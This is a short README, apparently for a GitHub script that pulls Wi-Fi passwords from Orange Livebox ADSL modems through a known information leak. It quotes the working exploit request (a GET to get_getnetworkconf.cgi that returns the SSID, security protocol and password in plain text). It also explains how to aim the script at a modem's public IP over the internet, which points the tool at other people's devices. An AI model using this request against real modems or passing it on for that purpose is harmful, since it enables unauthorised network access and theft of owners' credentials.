# Orange Livebox GET PASS
This script allows you to get the password from an Orange Livebox ADSL throught the <a href="https://github.com/zadewg/LIVEBOX-0DAY">"get_getnetworkconf.cgi" file vulnerabilty (CWE-200)</a>

<img src="https://raw.githubusercontent.com/BlueArduino20/Orange-Livebox-GET-PASS/master/1.png">

From @zadewg's GitHub (CWE-200):
<pre><code>The webserver leaks access point security protocol, SSID, and password in plain text.
GET http://192.168.1.1/get_getnetworkconf.cgi</code></pre>

**Note**: If you are going to use the public IP of the ADSL in order to use this script over the internet, make sure that it has the 8080 port open.

## Sources
- **@zadewg's GitHub**: https://github.com/zadewg/LIVEBOX-0DAY

- **badpackets.net**: https://badpackets.net/over-19000-orange-livebox-adsl-modems-are-leaking-their-wifi-credentials
